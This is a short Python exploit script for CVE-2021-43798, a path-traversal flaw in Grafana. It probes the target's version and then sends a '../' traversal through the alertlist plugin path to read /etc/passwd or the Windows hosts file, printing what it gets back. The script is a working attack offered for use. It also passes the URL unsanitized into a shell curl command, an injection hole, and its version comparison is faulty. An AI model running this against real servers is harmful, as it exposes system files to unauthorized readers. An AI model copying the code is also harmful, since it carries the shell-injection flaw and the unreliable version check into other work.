#!/bin/python
import requests, sys, argparse, json, os

file_name = sys.argv[0]

parser = argparse.ArgumentParser()
parser.description = """
Exploit the CVE-2021-43798 Grafana vulnerability. The vulnerable versions are 8.0.0-beta1 through 8.3.0 (except for patched versions).
"""

parser.add_argument("-u", help="url of Grafana", required=False)
parser.add_argument("-O", choices=["linux", "windows"], help="OS of the target", required=False)
args = parser.parse_args()

def getDivider():
	return "------------------------------------"

def is_vulnerable(url):
	print(getDivider() + " CHECK VERSION")
	vulnerable_version = "8.2.6"
	response = requests.get(f"{url}/api/health")
	
	if response.status_code != 200:
		print("Error while trying to get the Grafana version.")
		exit(1)
	
	version = json.loads(response.text)["version"]
	print("Current version: " + version)
	
	for k,v in enumerate(version):
		if vulnerable_version[k] < v:
			print("Application is not vulnerable...")
			return False
	
	print("Application is vulnerable!")
	return True

def exploit(url, operating_system="linux"):

	if operating_system == "windows":
		symbol = '\\\\'
		abs_path = "Windows\\System32\\drivers\\etc\\hosts"
	else:
		symbol = '/'
		abs_path = "etc/passwd"

	lfi = (".." + symbol) * 8
	path = url + '/public/plugins/alertlist/' + lfi + abs_path

	print(getDivider() + " REQUEST")
	print("Send request to " + path)
	res = os.popen(f'curl -s --path-as-is {path}').read()
	print(getDivider() + " RESPONSE")
	print(res)
	print(getDivider())

if __name__ == "__main__":
	if is_vulnerable(args.u):
		exploit(args.u, args.O)
